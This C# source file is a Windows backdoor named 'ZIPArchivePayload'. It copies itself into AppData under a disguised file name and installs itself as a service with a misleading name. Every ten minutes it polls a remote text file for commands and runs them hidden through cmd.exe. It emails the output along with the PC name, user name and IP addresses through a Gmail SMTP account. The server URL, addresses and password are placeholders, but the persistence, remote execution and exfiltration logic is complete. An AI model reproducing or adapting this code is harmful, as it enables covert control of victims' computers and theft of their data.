using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ZIPArchivePayload
{
    class Program
    {

        static Mutex mutex = new Mutex(true, "{6a28fd95-a97d-4bb0-801f-6afb10baa102}");

        static void Main(string[] args)
        {
			if (mutex.WaitOne(TimeSpan.Zero, true)) {
				string runAsService = "/install";
				if (args.Length != 0) {
					runAsService = args[0];
				}
				if (runAsService == "/service") { // run as service - log and send stuff
                    ServiceBase[] servicesToRun;
                    servicesToRun = new ServiceBase[] { new MainService() };
                    ServiceBase.Run(servicesToRun);
                } else { // create windows services
                    // copy file to appdata
                    String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
					String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
					String newFileLocationPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\aticlsxx.exe";
					File.Copy(filePath, newFileLocationPath, true);
                    // make it a service
                    ServiceInstaller.InstallAndStart("aticlsxx", "AND External Events Calc", newFileLocationPath + " /service");
                    // interract with desktop
                    ServiceInstaller.StopService("aticlsxx");
                    RegistryKey ckey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\aticlsxx", true);
                    if (ckey != null) {
                        if (ckey.GetValue("Type") != null) {
                            ckey.SetValue("Type", ((int)ckey.GetValue("Type") | 256));
                        }
                    }
                    ServiceInstaller.StartService("aticlsxx");
                }
			}
        }
    }

    partial class MainService : ServiceBase
    {
        public MainService()
        {
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 10*60000; // 10 minutes
            timer.Elapsed += new System.Timers.ElapsedEventHandler(time_elapsed);
            timer.Start();
        }

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
        }

        protected override void OnStop()
        {
            base.OnStop();
        }

        protected override void OnShutdown()
        {
            base.OnShutdown();
        }

        public void time_elapsed(object sender, System.Timers.ElapsedEventArgs args)
        {
            try
            {
                string onlineIP = new WebClient().DownloadString("http://icanhazip.com").ToString().Trim().Replace("\n", "").Replace("\r", "");
                string remoteCMD = new WebClient().DownloadString("Link to remote text file which contains cmd input").ToString().Trim().Replace("\n", "");

                string output = "";
                string title = "Status";
                if (remoteCMD != "") { // execute cmd
                    Process process = new Process();
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + remoteCMD;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.ErrorDialog = false;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(866);
                    //process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
                    process.Start();
                    StreamReader sr = process.StandardOutput;
                    process.WaitForExit();
                    if (process.HasExited) { output = sr.ReadToEnd(); }
                    //output = process.StandardOutput.ReadToEnd();
                    //process.WaitForExit();
                    title = "CMD output";
                }

                // get current username
                string currentUser = Application.StartupPath.ToString().Replace(Path.GetPathRoot(Environment.SystemDirectory).ToString() + @"Users\","").Replace(@"\AppData\Roaming\Microsoft","").ToString();

                // create body
                string body = "<b>PC name:</b> " + Environment.MachineName + "<br>";
                body += "<b>User name:</b> " + currentUser + "<br>";
                body += "<b>Online IP:</b> " + onlineIP + "<br>";
                body += "<b>LAN IP:</b><br>";
                foreach (var addr in Dns.GetHostEntry(Dns.GetHostName()).AddressList) {
                    if (addr.AddressFamily == AddressFamily.InterNetwork) body += "IPv4 Address: " + addr;
                }
                body += "<br>";
                body += "<b>OUTPUT:</b><br>" + output.ToString().Replace("\r\n","<br>");
                ///////////////////////////////////////////////////////////////////////////////////////////////////////
                if (remoteCMD != "") { // if command on the server is present - send mail, otherwise do nothing
                    SendEmail("first_level_mail_address", "second_level_mail_address", title, body);
                }
                ///////////////////////////////////////////////////////////////////////////////////////////////////////
            }
            catch { }
        }
        static void SendEmail(string strTo, string strFrom, string strSubject, string strBody)
        {
            MailAddress fromAddress = new MailAddress(strFrom);
            MailAddress toAddress = new MailAddress(strTo);
            const string fromPassword = "MAILPASSWORD";

            SmtpClient smtp = new SmtpClient()
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword),
                Timeout = 20000
            };

            using (MailMessage message = new MailMessage(fromAddress, toAddress)
            {
                Subject = strSubject,
                IsBodyHtml = true,
                Body = strBody
            })
            {
                /*if (File.Exists(Application.StartupPath + @"\AND logs\aticlsxx-log.txt")) {
                    Attachment logs = new Attachment(Application.StartupPath + @"\AND logs\aticlsxx-log.txt");
                    message.Attachments.Add(logs);
                }
                if (File.Exists(Application.StartupPath + @"\AND logs\aticlsxx-scr.jpg")) {
                    Attachment screenshot = new Attachment(Application.StartupPath + @"\AND logs\aticlsxx-scr.jpg");
                    message.Attachments.Add(screenshot);
                }*/
                smtp.Send(message);
            }
        }

    }

}
